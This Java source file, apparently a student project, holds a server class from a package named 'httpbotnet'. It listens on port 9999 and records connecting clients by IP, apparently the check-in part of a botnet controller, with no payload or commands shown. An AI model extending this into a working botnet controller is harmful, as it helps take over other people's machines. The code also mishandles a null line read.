/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package httpbotnet.threads;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Hashtable;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;

/**
 *
 * @author Student
 */
public class ServerThread {

   private Hashtable<String,Socket> clients = new Hashtable<String,Socket>();

    public Hashtable<String, Socket> getClients() {
        return clients;
    }

    public void setClients(Hashtable<String, Socket> clients) {
        this.clients = clients;
    }

   public void start() {
     Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    ServerSocket socket = new ServerSocket(9999);

                    while(true) {
                    final Socket client = socket.accept();

                    Thread clientThread = new Thread(new Runnable() {

                        public void run() {
                            BufferedReader reader = null;
                            try {
                                reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
                                String line = "";
                                while (line!=null) {
                                    line = reader.readLine();
                                    String ip = line.substring(line.indexOf(":")+1);
                                    JOptionPane.showMessageDialog(null, "IP:"+ip);
                                    clients.put(ip, client);
                                }
                            } catch (IOException ex) {
                                Logger.getLogger(ServerThread.class.getName()).log(Level.SEVERE, null, ex);
                            } finally {
                                try {
                                    reader.close();
                                } catch (IOException ex) {
                                    Logger.getLogger(ServerThread.class.getName()).log(Level.SEVERE, null, ex);
                                }
                            }
                        }
                    });


                    clientThread.start();
                    }

                } catch (IOException ex) {
                    Logger.getLogger(ServerThread.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        });

      thread.start();
   }
}
